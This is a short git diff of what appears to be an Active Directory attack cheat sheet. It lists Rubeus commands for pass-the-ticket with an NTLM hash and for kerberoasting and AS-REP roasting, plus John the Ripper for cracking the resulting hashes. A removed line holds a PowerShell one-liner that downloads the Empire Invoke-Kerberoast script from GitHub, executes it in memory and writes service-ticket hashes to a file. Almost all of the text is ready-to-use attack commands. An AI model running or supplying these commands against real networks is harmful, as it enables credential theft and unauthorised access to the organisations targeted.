@@ -85,14 +85,11 @@ You may already have a shell!
 
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
-Rubeus.exe kerberoast
-asrep
+```Rubeus.exe kerberoast/asreproast```
 
-john
+```john hash.txt```
 
 #### kerberoast
-`iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs
 
 #### mimikatz
 
